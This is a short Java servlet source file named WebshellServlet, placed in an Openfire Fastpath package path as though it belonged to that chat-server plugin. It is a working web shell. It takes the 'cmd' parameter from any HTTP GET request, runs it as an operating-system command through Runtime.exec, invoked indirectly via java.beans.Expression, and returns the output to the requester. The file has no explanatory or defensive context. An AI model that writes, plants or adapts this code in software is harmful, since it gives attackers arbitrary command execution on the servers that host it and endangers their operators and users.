package org.jivesoftware.openfire.fastpath;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.beans.Expression;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.BufferedReader;

public class WebshellServlet extends HttpServlet {
    @Override
    public void doGet(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {
        try {
            res.setContentType("text/plain");
            String cmd = req.getParameter("cmd");
            Expression expr = new Expression(Runtime.getRuntime(), "exec", new Object[]{cmd});
            Process process = (Process) expr.getValue();
            InputStream in = process.getInputStream();

            StringBuilder sb = new StringBuilder();
            InputStreamReader resultReader = new InputStreamReader(in);
            BufferedReader stdInput = new BufferedReader(resultReader);
            String s;
            while ((s = stdInput.readLine()) != null) {
                sb.append(s).append("\n");
            }
            res.getWriter().print(sb);
        } catch (ServletException | IOException e) {
            throw e;
        } catch (Exception e) {
            System.out.println(e.getMessage());
        }
    }
}
